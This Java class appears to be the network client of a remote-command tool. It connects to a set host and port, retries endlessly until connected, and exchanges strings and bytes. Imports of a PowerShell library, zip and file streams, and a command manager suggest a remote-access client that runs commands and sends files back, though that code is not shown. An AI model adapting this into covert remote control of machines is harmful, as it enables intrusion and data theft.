package connection;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import com.profesorfalken.jpowershell.PowerShell;
import com.profesorfalken.jpowershell.PowerShellResponse;

import commands.CommandManager;

public class ClientSide {
	private Socket s;
	private String _ip;
	private int _port;
	private DataOutputStream dout;
	private DataInputStream din;
	private PowerShell powerShell;
	
	public ClientSide(String hostIP, int port) {
		_ip = hostIP;
		_port = port;
	}
	
	public String receive() throws IOException {
		return din.readUTF();
	}
	
	public boolean isClosed() {
		return s.isClosed();
	}
	
	public void send(String msg) throws IOException {
		dout.writeUTF(msg);
		dout.flush();
	}
	
	public void send(byte[] buffer) throws IOException {
		dout.write(buffer);
		dout.flush();
	}
	
	public void end() throws IOException {
		try{s.close();}catch (NullPointerException ex) {}
	}
	
	public void reset() throws IOException {
		while(!initConnection());
		System.gc(); //Calls the garbage collector because of the previous function
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
	}
	
	private boolean initConnection() {
        try
        {
            s = new Socket(_ip,_port);
            return true;
        }
        catch(Exception err){return false;}
    }
}
